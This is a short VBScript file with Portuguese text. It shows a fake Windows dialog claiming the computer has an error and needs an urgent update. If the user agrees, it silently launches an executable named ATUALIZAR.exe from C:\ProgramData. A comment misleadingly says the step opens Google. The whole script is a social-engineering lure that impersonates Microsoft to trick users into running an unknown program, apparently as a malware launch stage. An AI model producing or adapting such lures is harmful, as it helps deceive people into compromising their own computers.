Dim resposta
resposta = MsgBox("Voce precisa atualizar o windows para a versao mais recente. Deseja atualizar agora? O computador precisa atualizar para que o sistema funcione corretamente. Foi encontrado um erro no seu computador e ele precisa ser reparado antes que seu progresso seja perdido.", vbYesNo, "Windows")
 
If resposta = vbYes Then
    ' Abrir o Google
   Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\ProgramData\ATUALIZAR.exe", 1, false
Set objShell = Nothing
Else
    ' Exibir uma mensagem se o botão "Não" for clicado
    MsgBox "Voce adiou a atualizacao.", vbInformation, "Windows"
End If
